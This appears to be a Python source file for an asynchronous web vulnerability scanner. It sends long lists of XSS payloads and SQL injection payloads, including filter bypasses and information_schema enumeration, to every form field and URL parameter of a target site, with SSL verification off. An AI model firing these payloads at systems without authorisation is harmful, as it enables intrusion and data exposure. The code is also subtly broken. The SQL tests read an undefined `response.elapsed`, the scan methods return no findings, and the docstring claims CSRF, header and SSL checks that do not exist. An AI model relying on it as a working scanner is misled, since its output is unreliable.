"""
VulnerabilityScanner - An asynchronous web application security scanner

This module provides a comprehensive vulnerability scanning solution with support for:
- XSS (Cross-Site Scripting)
- SQL Injection
- CSRF (Cross-Site Request Forgery)
- Security Headers
- SSL/TLS Configuration
- Broken Access Control

Usage:
    scanner = VulnerabilityScanner(url="https://example.com")
    async with scanner:
        results = await scanner.scan()
"""

from typing import Dict, List, Optional, Any, Tuple
import aiohttp
import asyncio
import logging
import traceback
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import urllib.parse
import re
import time
from datetime import datetime as dt
from datetime import timezone
from colorama import Fore, Style, init
import sys
import psutil
import threading
import random
import atexit
import json
from models import db
from modules.command_injection_scanner import CommandInjectionScanner
from modules.ssrf_scanner import SSRFScanner

# Initialize colorama for cross-platform color support
init()

# Set up logging with file output
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('scanner.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class SessionManager:
    def __init__(self):
        self.session = None
        self._lock = asyncio.Lock()
        self.logger = logging.getLogger("vulnscan")
        
    async def __aenter__(self):
        if not self.session:
            self.session = aiohttp.ClientSession()
        return self.session
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
            self.session = None
            
    async def get_session(self):
        async with self._lock:
            if not self.session:
                self.session = aiohttp.ClientSession()
            return self.session
            
    async def cleanup(self):
        """Cleanup session resources"""
        if self.session and not self.session.closed:
            await self.session.close()
            self.session = None
        self.logger.info("Cleanup completed")

class RateLimiter:
    def __init__(self, requests_per_second, burst_size):
        self.requests_per_second = requests_per_second
        self.burst_size = burst_size
        self.tokens = burst_size
        self.last_update = time.monotonic()
        self._lock = asyncio.Lock()
        self._waiting = 0

    async def acquire(self):
        """Improved rate limiting with queue tracking"""
        async with self._lock:
            now = time.monotonic()
            time_passed = now - self.last_update
            self.tokens = min(
                self.burst_size,
                self.tokens + time_passed * self.requests_per_second
            )
            
            self._waiting += 1
            try:
                if self.tokens < 1:
                    wait_time = (1 - self.tokens) / self.requests_per_second
                    # Add jitter to prevent thundering herd
                    wait_time += random.uniform(0, 0.1)
                    await asyncio.sleep(wait_time)
                    self.tokens = 1
                
                self.tokens -= 1
                self.last_update = now
            finally:
                self._waiting -= 1

class BaseScanner:
    """Base scanner class with common functionality"""
    
    def __init__(self, url, session=None):
        self.url = url if url.startswith(('http://', 'https://')) else f'http://{url}'
        self.session = session
        self.logger = logging.getLogger(self.__class__.__name__)
        self.vulnerabilities = []
        self.requests_made = 0
        self.max_retries = 3
        self.retry_delay = 1
        self.timeout = aiohttp.ClientTimeout(total=10)
        
    async def make_request(self, url, method='GET', data=None, headers=None, verify_ssl=False):
        """Make an HTTP request with retry logic"""
        if not headers:
            headers = {}
            
        for attempt in range(self.max_retries):
            try:
                async with self.session.request(
                    method, 
                    url, 
                    data=data, 
                    headers=headers,
                    ssl=verify_ssl,
                    timeout=self.timeout
                ) as response:
                    self.requests_made += 1
                    content = await response.text()
                    return content, response.headers, response.status
                    
            except Exception as e:
                if attempt == self.max_retries - 1:
                    raise
                await asyncio.sleep(self.retry_delay * (attempt + 1))
                
    def add_vulnerability(self, vulnerability_type, description, severity="Medium", evidence=None, reproduction_steps=None):
        """Add a vulnerability finding"""
        evidence_dict = evidence or {}
        steps = reproduction_steps or []
        
        # Ensure reproduction steps is a list of strings
        if isinstance(steps, str):
            steps = [steps]
            
        vuln = {
            'type': vulnerability_type,
            'description': description,
            'severity': severity,
            'evidence': json.dumps(evidence_dict),  # Serialize evidence to JSON
            'reproduction_steps': json.dumps(steps),  # Serialize steps to JSON
            'timestamp': dt.now(timezone.utc).isoformat()
        }
        self.vulnerabilities.append(vuln)
        return vuln
        
    async def scan(self):
        """Base scan method to be implemented by subclasses"""
        return await self._scan()
        
    async def _scan(self):
        """Internal scan method to be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement _scan method")

class XSSScanner(BaseScanner):
    def __init__(self, url, session=None):
        super().__init__(url, session)
        self.xss_payloads = [
            # Basic Script Injection
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '</script><script>alert(1)</script>',
            
            # Event Handler Injections
            '" onmouseover="alert(1)"',
            "' onmouseover='alert(1)'",
            '" onload="alert(1)"',
            "' onload='alert(1)'",
            '" onerror="alert(1)"',
            "' onerror='alert(1)'",
            '" onfocus="alert(1)"',
            "' onfocus='alert(1)'",
            
            # HTML Tag Injections
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '<svg onload=alert(1)>',
            '"><svg onload=alert(1)>',
            "'><svg onload=alert(1)>",
            
            # JavaScript Protocol
            'javascript:alert(1)',
            'javascript:alert(1)//',
            'javascript:alert(1);//',
            
            # Encoded Payloads
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            
            # Template Literal
            '`<script>alert(1)</script>`',
            '"><script>alert`1`</script>',
            "'><script>alert`1`</script>",
            
            # DOM-based XSS
            '"><img src=x id="x" onerror="(()=>{alert(1)})()">', 
            '"><script>(()=>{alert(1)})()</script>',
            
            # Exotic Payloads
            '<details open ontoggle=alert(1)>',
            '<body onpageshow=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<video src=x onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            
            # Bypass Attempts
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<script>al\u0065rt(1)</script>',
            '<scr\x00ipt>alert(1)</scr\x00ipt>',
            '"><script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>',
            
            # Mixed Context
            '\'/><script>alert(1)</script><input value=\'',
            '`/><script>alert(1)</script><input value=`',
            
            # SVG Context
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set attributeName=onmouseover value=alert(1)>',
            
            # CSS Context
            '<style>@import "data:,alert(1)";</style>',
            '"><style>*{background-image:url("javascript:alert(1)")}</style>',
            
            # Meta Refresh
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            
            # Base Tag
            '<base href="javascript:alert(1);//">',
            
            # Link Tag
            '<link rel="import" href="data:text/html,<script>alert(1)</script>">',
            
            # Unicode Escapes
            '<script>\u0061\u006C\u0065\u0072\u0074(1)</script>',
            
            # HTML5 Elements
            '<details ontoggle="alert(1)" open>',
            '<marquee onstart=alert(1)>',
            '<meter onmouseover=alert(1)>',
            '<object data="data:text/html,<script>alert(1)</script>">',
            
            # Recursive Payloads
            '"><script>eval(atob("YWxlcnQoMSk="))</script>',
            '"><img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">'
        ]
        
    async def find_input_points(self, url):
        input_points = []
        try:
            self.logger.info(f"Fetching page content from {url}")
            async with self.session.get(url, verify_ssl=False, timeout=self.timeout) as response:
                if response.status != 200:
                    self.logger.warning(f"Received non-200 status code: {response.status}")
                    return input_points
                
                content = await response.text()
                self.logger.info("Successfully retrieved page content")
                
                soup = BeautifulSoup(content, 'html.parser')
                
                # URL Parameters
                parsed_url = urlparse(url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        self.logger.debug(f"Found URL parameter: {param}")
                        input_points.append(('url_param', param))
                
                # Form Inputs
                forms = soup.find_all('form')
                self.logger.info(f"Found {len(forms)} forms")
                for form in forms:
                    method = form.get('method', 'get').lower()
                    action = form.get('action', '')
                    if not action:
                        action = url
                    elif not action.startswith(('http://', 'https://')):
                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                        action = urllib.parse.urljoin(base_url, action)
                    
                    self.logger.debug(f"Processing form: method={method}, action={action}")
                    
                    # Get all input elements
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    for input_elem in inputs:
                        input_name = input_elem.get('name', '')
                        if input_name:
                            self.logger.debug(f"Found form input: {input_name}")
                            input_points.append(('form', {
                                'method': method,
                                'action': action,
                                'name': input_name,
                                'type': input_elem.get('type', 'text')
                            }))
                
                self.logger.info(f"Found {len(input_points)} input points")
                return input_points
                
        except aiohttp.ClientError as e:
            self.logger.error(f"Network error while fetching {url}: {str(e)}")
        except Exception as e:
            self.logger.error(f"Error finding input points: {str(e)}")
            self.logger.debug(traceback.format_exc())
        
        return input_points

    async def test_input_point(self, input_type, input_point, payload):
        try:
            self.logger.debug(f"Testing {input_type} with payload: {payload}")
            
            if input_type == 'url_param':
                # Test URL parameters
                parsed_url = urlparse(self.url)
                params = dict(urllib.parse.parse_qsl(parsed_url.query))
                params[input_point] = payload
                query = urllib.parse.urlencode(params)
                test_url = parsed_url._replace(query=query).geturl()
                
                self.logger.debug(f"Testing URL parameter at: {test_url}")
                async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as response:
                    if response.status != 200:
                        self.logger.warning(f"Received non-200 status code: {response.status}")
                        return
                        
                    content = await response.text()
                    if await self.check_payload_reflection(content, payload):
                        self.logger.info(f"Found XSS vulnerability in URL parameter: {input_point}")
                        steps = [
                            f"1. Navigate to {self.url}",
                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
                            "3. Observe that the payload is executed in the response"
                        ]
                        self.add_vulnerability(
                            "XSS",
                            f"XSS vulnerability found in URL parameter '{input_point}'",
                            "High",
                            {"url": test_url, "payload": payload},
                            reproduction_steps=steps
                        )
            
            elif input_type == 'form':
                # Test form inputs
                method = input_point['method']
                action = input_point['action']
                data = {input_point['name']: payload}
                
                self.logger.debug(f"Testing form submission: method={method}, action={action}, data={data}")
                
                if method == 'get':
                    params = urllib.parse.urlencode(data)
                    test_url = f"{action}?{params}"
                    async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as response:
                        if response.status != 200:
                            self.logger.warning(f"Received non-200 status code: {response.status}")
                            return
                        content = await response.text()
                else:  # POST
                    async with self.session.post(action, data=data, verify_ssl=False, timeout=self.timeout) as response:
                        if response.status != 200:
                            self.logger.warning(f"Received non-200 status code: {response.status}")
                            return
                        content = await response.text()
                
                if await self.check_payload_reflection(content, payload):
                    self.logger.info(f"Found XSS vulnerability in form input: {input_point['name']}")
                    form_action = input_point.get('action', '')
                    method = input_point.get('method', 'get').lower()
                    input_name = input_point.get('name', '')
                    
                    steps = [
                        f"1. Navigate to {self.url}",
                        f"2. Locate the form with action '{form_action}'",
                        f"3. Enter the following payload in the '{input_name}' field: {payload}",
                        f"4. Submit the form using {method.upper()} method",
                        "5. Observe that the payload is executed in the response"
                    ]
                    
                    self.add_vulnerability(
                        'XSS',
                        f"XSS vulnerability found in form input '{input_name}'",
                        'High',
                        evidence={
                            'form_action': form_action,
                            'method': method,
                            'payload': payload,
                            'input_name': input_name
                        },
                        reproduction_steps=steps
                    )
                    
        except aiohttp.ClientError as e:
            self.logger.error(f"Network error while testing input point: {str(e)}")
        except Exception as e:
            self.logger.error(f"Error testing input point: {str(e)}")
            self.logger.debug(traceback.format_exc())
        
        return

    async def check_payload_reflection(self, content, payload):
        # Check for exact payload match
        if payload in content:
            return True
            
        # Check for URL-decoded payload
        url_decoded = urllib.parse.unquote(payload)
        if url_decoded in content:
            return True
            
        # Check for HTML-decoded payload
        html_decoded = BeautifulSoup(content, 'html.parser').get_text()
        if payload in html_decoded:
            return True
            
        # Check for payload in script tags
        soup = BeautifulSoup(content, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if payload in str(script):
                return True
                
        # Check for payload in event handlers
        for tag in soup.find_all():
            for attr in tag.attrs:
                if attr.startswith('on') and payload in str(tag[attr]):
                    return True
                    
        # Check for case-insensitive matches
        if payload.lower() in content.lower():
            return True
            
        return False

    async def _scan(self):
        self.logger.info(f"Starting XSS scan for {self.url}")
        
        # Find all input points
        input_points = await self.find_input_points(self.url)
        self.logger.info(f"Found {len(input_points)} potential input points")
        
        # Test each input point with each payload
        for input_type, input_point in input_points:
            self.logger.info(f"Testing input point: {input_type} - {input_point}")
            for payload in self.xss_payloads:
                self.logger.debug(f"Testing payload: {payload}")
                await self.test_input_point(input_type, input_point, payload)
                
        self.logger.info("XSS scan completed")

class SQLInjectionScanner(BaseScanner):
    def __init__(self, url, session=None):
        super().__init__(url, session)
        self.sql_payloads = [
            # Boolean-based payloads
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1 -- ",
            "' OR 1=1 #",
            "' OR 'x'='x",
            "admin' --",
            "admin' #",
            "' OR 'x'='x';--",
            
            # Error-based payloads
            "'",
            '"',
            "')",
            "'))",
            "'))",
            "'--",
            '";--',
            '""',
            "''",
            "`",
            "´",
            "¨",
            "',",
            '",',
            
            # UNION-based payloads
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            
            # Time-based payloads
            "' OR SLEEP(5)--",
            "' OR SLEEP(5)='",
            "1' OR SLEEP(5)#",
            "' OR pg_sleep(5)--",
            "' OR WAITFOR DELAY '0:0:5'--",
            
            # Stacked queries
            "'; SELECT SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            
            # Database specific payloads
            # MySQL
            "' OR IF(1=1, SLEEP(5), 0)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # PostgreSQL
            "' OR (SELECT pg_sleep(5))--",
            "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            
            # MSSQL
            "' OR WAITFOR DELAY '0:0:5'--",
            "' OR IF EXISTS(SELECT * FROM users) WAITFOR DELAY '0:0:5'--",
            
            # Oracle
            "' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",
            
            # Advanced payloads
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'+BENCHMARK(10000000,MD5(1))+'",
            
            # Blind SQL injection
            "' OR 1=1 AND SLEEP(5)--",
            "' OR 1=2 AND SLEEP(5)--",
            "' OR SUBSTR(@@version,1,1)='5' AND SLEEP(5)--",
            
            # Out-of-band payloads
            "'; DECLARE @q VARCHAR(8000);SELECT @q=0x73656C65637420404076657273696F6E;EXEC(@q)--",
            "'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version;--",
            
            # Common table names
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT NULL,table_name FROM information_schema.tables--",
            
            # Column enumeration
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--"
        ]
        
        # Error patterns that might indicate SQL injection vulnerability
        self.error_patterns = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_.*",
            "MySqlClient\.",
            "PostgreSQL.*ERROR",
            "Warning.*pg_.*",
            "valid PostgreSQL result",
            "Npgsql\.",
            "Driver.* SQL[-_ ]*Server",
            "OLE DB.* SQL Server",
            "SQLServer JDBC Driver",
            "Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "Oracle error",
            "Oracle.*Driver",
            "Warning.*oci_.*",
            "Warning.*ora_.*",
            "CLI Driver.*DB2",
            "DB2 SQL error",
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            "Warning.*sqlite_.*",
            "Warning.*SQLite3::",
            "SQLITE_ERROR",
            "SQL syntax.*POS([0-9]+)",
            "MariaDB server version for the right syntax"
        ]

    async def find_input_points(self, url):
        """Find potential SQL injection points in the application"""
        input_points = []
        try:
            self.logger.info(f"Finding SQL injection points for {url}")
            async with self.session.get(url, verify_ssl=False, timeout=self.timeout) as response:
                if response.status != 200:
                    self.logger.warning(f"Received non-200 status code: {response.status}")
                    return input_points
                
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                # Find forms that might interact with database
                forms = soup.find_all('form')
                self.logger.info(f"Found {len(forms)} forms to test")
                
                for form in forms:
                    method = form.get('method', 'get').lower()
                    action = form.get('action', '')
                    if not action:
                        action = url
                    elif not action.startswith(('http://', 'https://')):
                        base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
                        action = urllib.parse.urljoin(base_url, action)
                    
                    # Look for input fields that might be used in SQL queries
                    inputs = form.find_all(['input', 'textarea'])
                    for input_elem in inputs:
                        input_type = input_elem.get('type', 'text')
                        input_name = input_elem.get('name', '')
                        if input_name and input_type in ['text', 'password', 'search', 'number', 'hidden']:
                            self.logger.debug(f"Found potential SQL injection point in form: {input_name}")
                            input_points.append(('form', {
                                'method': method,
                                'action': action,
                                'name': input_name,
                                'type': input_type
                            }))
                
                # Find URL parameters
                parsed_url = urlparse(url)
                if parsed_url.query:
                    params = urllib.parse.parse_qs(parsed_url.query)
                    for param in params:
                        self.logger.debug(f"Found URL parameter: {param}")
                        input_points.append(('url_param', param))
                
                self.logger.info(f"Found total {len(input_points)} potential SQL injection points")
                return input_points
                
        except Exception as e:
            self.logger.error(f"Error finding SQL injection points: {str(e)}")
            self.logger.debug(traceback.format_exc())
        
        return input_points

    async def test_input_point(self, input_type, input_point, payload):
        """Test an input point for SQL injection vulnerabilities"""
        try:
            self.logger.debug(f"Testing {input_type} with SQL payload: {payload}")
            
            if input_type == 'url_param':
                # Test URL parameters
                parsed_url = urlparse(self.url)
                params = dict(urllib.parse.parse_qsl(parsed_url.query))
                params[input_point] = payload
                query = urllib.parse.urlencode(params)
                test_url = parsed_url._replace(query=query).geturl()
                
                self.logger.debug(f"Testing URL parameter at: {test_url}")
                
                # First request with normal value
                async with self.session.get(test_url.replace(payload, "normal_value"), verify_ssl=False, timeout=self.timeout) as normal_response:
                    normal_content = await normal_response.text()
                    normal_time = response.elapsed.total_seconds()
                
                # Second request with SQL injection payload
                start_time = time.time()
                async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as response:
                    content = await response.text()
                    response_time = time.time() - start_time
                    
                    # Check for SQL errors
                    if any(re.search(pattern, content, re.IGNORECASE) for pattern in self.error_patterns):
                        self.logger.info(f"Found SQL injection vulnerability (error-based) in URL parameter: {input_point}")
                        steps = [
                            f"1. Navigate to {self.url}",
                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
                            "3. Observe the SQL error in the response"
                        ]
                        self.add_vulnerability(
                            "SQL Injection",
                            f"Error-based SQL injection vulnerability found in URL parameter '{input_point}'",
                            "High",
                            {"url": test_url, "payload": payload, "error_type": "Error-based"},
                            reproduction_steps=steps
                        )
                    
                    # Check for time-based injection
                    elif response_time > normal_time + 4:  # Assuming 5-second sleep payloads
                        self.logger.info(f"Found SQL injection vulnerability (time-based) in URL parameter: {input_point}")
                        steps = [
                            f"1. Navigate to {self.url}",
                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
                            f"3. Observe that the response takes more than {int(response_time)} seconds"
                        ]
                        self.add_vulnerability(
                            "SQL Injection",
                            f"Time-based SQL injection vulnerability found in URL parameter '{input_point}'",
                            "High",
                            {"url": test_url, "payload": payload, "response_time": response_time, "error_type": "Time-based"},
                            reproduction_steps=steps
                        )
                    
                    # Check for boolean-based injection
                    elif len(content) != len(normal_content):
                        self.logger.info(f"Potential SQL injection vulnerability (boolean-based) in URL parameter: {input_point}")
                        steps = [
                            f"1. Navigate to {self.url}",
                            f"2. Modify the URL parameter '{input_point}' to contain: {payload}",
                            "3. Compare the response with a normal request",
                            "4. Observe the difference in response content"
                        ]
                        self.add_vulnerability(
                            "SQL Injection",
                            f"Boolean-based SQL injection vulnerability found in URL parameter '{input_point}'",
                            "High",
                            {"url": test_url, "payload": payload, "error_type": "Boolean-based"},
                            reproduction_steps=steps
                        )
            
            elif input_type == 'form':
                # Test form inputs
                method = input_point['method']
                action = input_point['action']
                data = {input_point['name']: payload}
                
                self.logger.debug(f"Testing form submission: method={method}, action={action}, data={data}")
                
                # First request with normal value
                normal_data = {input_point['name']: "normal_value"}
                if method == 'get':
                    params = urllib.parse.urlencode(normal_data)
                    test_url = f"{action}?{params}"
                    async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as normal_response:
                        normal_content = await normal_response.text()
                        normal_time = response.elapsed.total_seconds()
                else:
                    async with self.session.post(action, data=normal_data, verify_ssl=False, timeout=self.timeout) as normal_response:
                        normal_content = await normal_response.text()
                        normal_time = response.elapsed.total_seconds()
                
                # Second request with SQL injection payload
                start_time = time.time()
                if method == 'get':
                    params = urllib.parse.urlencode(data)
                    test_url = f"{action}?{params}"
                    async with self.session.get(test_url, verify_ssl=False, timeout=self.timeout) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                else:
                    async with self.session.post(action, data=data, verify_ssl=False, timeout=self.timeout) as response:
                        content = await response.text()
                        response_time = time.time() - start_time
                
                # Check for SQL errors
                if any(re.search(pattern, content, re.IGNORECASE) for pattern in self.error_patterns):
                    self.logger.info(f"Found SQL injection vulnerability (error-based) in form input: {input_point['name']}")
                    steps = [
                        f"1. Navigate to {self.url}",
                        f"2. Locate the form with action '{action}'",
                        f"3. Enter the following payload in the '{input_point['name']}' field: {payload}",
                        f"4. Submit the form using {method.upper()} method",
                        "5. Observe the SQL error in the response"
                    ]
                    self.add_vulnerability(
                        "SQL Injection",
                        f"Error-based SQL injection vulnerability found in form input '{input_point['name']}'",
                        "High",
                        {
                            'form_action': action,
                            'method': method,
                            'input_name': input_point['name'],
                            'payload': payload,
                            'error_type': "Error-based"
                        },
                        reproduction_steps=steps
                    )
                
                # Check for time-based injection
                elif response_time > normal_time + 4:  # Assuming 5-second sleep payloads
                    self.logger.info(f"Found SQL injection vulnerability (time-based) in form input: {input_point['name']}")
                    steps = [
                        f"1. Navigate to {self.url}",
                        f"2. Locate the form with action '{action}'",
                        f"3. Enter the following payload in the '{input_point['name']}' field: {payload}",
                        f"4. Submit the form using {method.upper()} method",
                        f"5. Observe that the response takes more than {int(response_time)} seconds"
                    ]
                    self.add_vulnerability(
                        "SQL Injection",
                        f"Time-based SQL injection vulnerability found in form input '{input_point['name']}'",
                        "High",
                        {
                            'form_action': action,
                            'method': method,
                            'input_name': input_point['name'],
                            'payload': payload,
                            'response_time': response_time,
                            'error_type': "Time-based"
                        },
                        reproduction_steps=steps
                    )
                
                # Check for boolean-based injection
                elif len(content) != len(normal_content):
                    self.logger.info(f"Potential SQL injection vulnerability (boolean-based) in form input: {input_point['name']}")
                    steps = [
                        f"1. Navigate to {self.url}",
                        f"2. Locate the form with action '{action}'",
                        f"3. Enter the following payload in the '{input_point['name']}' field: {payload}",
                        f"4. Submit the form using {method.upper()} method",
                        "5. Compare the response with a normal request",
                        "6. Observe the difference in response content"
                    ]
                    self.add_vulnerability(
                        "SQL Injection",
                        f"Boolean-based SQL injection vulnerability found in form input '{input_point['name']}'",
                        "High",
                        {
                            'form_action': action,
                            'method': method,
                            'input_name': input_point['name'],
                            'payload': payload,
                            'error_type': "Boolean-based"
                        },
                        reproduction_steps=steps
                    )
                    
        except aiohttp.ClientError as e:
            self.logger.error(f"Network error while testing SQL injection point: {str(e)}")
        except Exception as e:
            self.logger.error(f"Error testing SQL injection point: {str(e)}")
            self.logger.debug(traceback.format_exc())

    async def _scan(self):
        self.logger.info(f"Starting SQL injection scan for {self.url}")
        
        # Find all input points
        input_points = await self.find_input_points(self.url)
        self.logger.info(f"Found {len(input_points)} potential SQL injection points")
        
        # Test each input point with each payload
        for input_type, input_point in input_points:
            self.logger.info(f"Testing input point: {input_type} - {input_point}")
            for payload in self.sql_payloads:
                self.logger.debug(f"Testing SQL payload: {payload}")
                await self.test_input_point(input_type, input_point, payload)
                
        self.logger.info("SQL injection scan completed")

class VulnerabilityScanner:
    def __init__(self, url):
        self.url = url
        self.session = None
        self.xss_scanner = None
        self.sql_scanner = None
        self.cmd_scanner = None
        self.ssrf_scanner = None
        self.logger = logging.getLogger(self.__class__.__name__)
        self.vulnerabilities = []
        self.scan_status = {}
        
    async def __aenter__(self):
        await self.initialize()
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.cleanup()
        
    async def initialize(self):
        """Initialize the scanner and its components"""
        try:
            if not self.session:
                timeout = aiohttp.ClientTimeout(total=30)
                self.session = aiohttp.ClientSession(timeout=timeout)
                
            config = {
                'timeout': 30,
                'max_retries': 3,
                'retry_delay': 1,
                'headers': {
                    'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                    'Accept': '*/*'
                }
            }
            
            if not self.xss_scanner:
                self.xss_scanner = XSSScanner(self.url, self.session)
            if not self.sql_scanner:
                self.sql_scanner = SQLInjectionScanner(self.url, self.session)
            if not self.cmd_scanner:
                self.cmd_scanner = CommandInjectionScanner(self.url, self.session)
            if not self.ssrf_scanner:
                self.ssrf_scanner = SSRFScanner(self.url, self.session)
                
            self.logger.info("All scanners initialized successfully")
            
        except Exception as e:
            self.logger.error(f"Error initializing scanners: {str(e)}")
            await self.cleanup()
            raise
            
    async def scan(self, checks=None):
        """Perform vulnerability scan with enhanced error handling and progress tracking"""
        try:
            await self.initialize()
            
            if not checks:
                checks = ['xss', 'sql', 'cmd', 'ssrf']
                
            # Initialize scan status
            self.scan_status = {check: 'pending' for check in checks}
            
            # Run scans concurrently
            tasks = []
            if 'xss' in checks:
                self.scan_status['xss'] = 'running'
                tasks.append(self._run_scanner('xss', self.xss_scanner.scan()))
            if 'sql' in checks:
                self.scan_status['sql'] = 'running'
                tasks.append(self._run_scanner('sql', self.sql_scanner.scan()))
            if 'cmd' in checks:
                self.scan_status['cmd'] = 'running'
                tasks.append(self._run_scanner('cmd', self.cmd_scanner.scan()))
            if 'ssrf' in checks:
                self.scan_status['ssrf'] = 'running'
                tasks.append(self._run_scanner('ssrf', self.ssrf_scanner.scan()))
            
            # Wait for all scans to complete
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            for scanner_type, result in zip(checks, results):
                if isinstance(result, Exception):
                    self.logger.error(f"{scanner_type.upper()} scan error: {str(result)}")
                    self.scan_status[scanner_type] = 'error'
                else:
                    self.scan_status[scanner_type] = 'completed'
                    if result:
                        self.vulnerabilities.extend(result)
            
            return {
                'vulnerabilities': self.vulnerabilities,
                'total_vulnerabilities': len(self.vulnerabilities),
                'status': 'completed',
                'scan_status': self.scan_status,
                'metrics': {
                    'total_requests': sum(
                        getattr(scanner, 'requests_made', 0)
                        for scanner in [self.xss_scanner, self.sql_scanner, self.cmd_scanner, self.ssrf_scanner]
                        if scanner
                    ),
                    'checks_performed': checks
                }
            }
            
        except Exception as e:
            self.logger.error(f"Error during vulnerability scan: {str(e)}")
            return {
                'vulnerabilities': [],
                'total_vulnerabilities': 0,
                'status': 'error',
                'error': str(e),
                'scan_status': self.scan_status
            }
            
        finally:
            await self.cleanup()
            
    async def _run_scanner(self, scanner_type, scan_coroutine):
        """Run individual scanner with error handling"""
        try:
            self.logger.info(f"Starting {scanner_type.upper()} scan")
            result = await scan_coroutine
            self.logger.info(f"Completed {scanner_type.upper()} scan")
            return result
        except Exception as e:
            self.logger.error(f"Error in {scanner_type.upper()} scan: {str(e)}")
            raise
